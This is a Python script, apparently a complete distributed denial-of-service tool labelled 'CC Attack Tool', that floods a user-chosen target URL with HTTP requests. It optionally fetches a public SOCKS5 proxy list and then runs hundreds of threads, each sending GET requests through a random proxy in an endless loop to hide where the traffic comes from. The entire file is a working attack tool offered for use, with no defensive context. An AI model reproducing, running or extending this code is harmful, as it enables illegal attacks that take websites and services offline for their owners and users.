import requests
import random
import time
import threading
from colorama import Fore

print(Fore.GREEN + """    	     .,:ccllllc:,.              
          .lOXWMMMMMMMMMWXOo,           
        .lKWMMMMMMMMMMMMMMMMNk:.        
      .oKWMMMMMMMMMMMMMMMMMMMMNx'       
     .xWMMMMMMMMMMMMMMMMMMMMMMMWO'      
     ;KMMMMMMMMMMMMMMMMMMMMMMMMMWd.     
     :XNKXWMMMMMMMMMMMMMMMMMMNXXWk.     
     ;Kx..:d0NMMMMMMMMMMMMXkc,.;0d.     
     .OO'   .,oOXWMMMMNKkc'    c0:      
      :KOc,.....:xXNNKd,....';oKk.      
       cXMWXK000XOlccdKK00KXNWMNc       
      .dWMMWX0XMNdcocckMMWX00NMNl       
      .oXX0o..oWWNNWNXNMMK; .oKx'       
        ....  cNXNNXXXOKWx.  ..         
              ,KKKX000OKK;              
              '0KKX0KK0X0'              
              .OK0XKKK0XO.              
              .k00K0K00Xk.              
               ldxOxOkx0o               
               ..',,;,',.               
""")
print("  CC Attack Tool Using Requests Module")
print("      Code By GogoZin. -2019/8/2")

def opth():
	for g in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(g+1)+ " Created ")
		time.sleep(0.01)
	print("Wait A Few Seconds For Threads Ready To Attack . . .")
	global tt
	tt = True
	
def main():
	global pprr
	global lts
	global proxy
	global url
	global pwr
	global thr
	url = str(input(Fore.BLUE + "Target : " + Fore.WHITE))
	thr = int(input(Fore.BLUE + "Threads (Default Is 300) : " + Fore.WHITE))
	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
	if cho =='y':
		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1000&country=all')
		with open('socks.txt','wb') as fp:
			fp.write(rsp.content)
			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
	else:
		pass
	lts = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
	if lts == "":
		lts = 'socks.txt'
	else:
		lts = str(lts)
	pwr = int(input(Fore.BLUE + "CC.Power (1-100 Default Is 70) : " + Fore.WHITE))
	opth()

def atk():
	pprr = open(lts).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = requests.session()
	s.proxies = {}
	s.proxies['http'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
	s.proxies['https'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
	time.sleep(10)
	while True:
		while tt:
			try:
				for y in range(pwr):
					s.get(url)
					print(Fore.BLUE + "Socks Ddos From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
			except:
				s.close()
				print(Fore.RED + "Socks Down !" + Fore.WHITE)


if __name__ == "__main__":
	main()
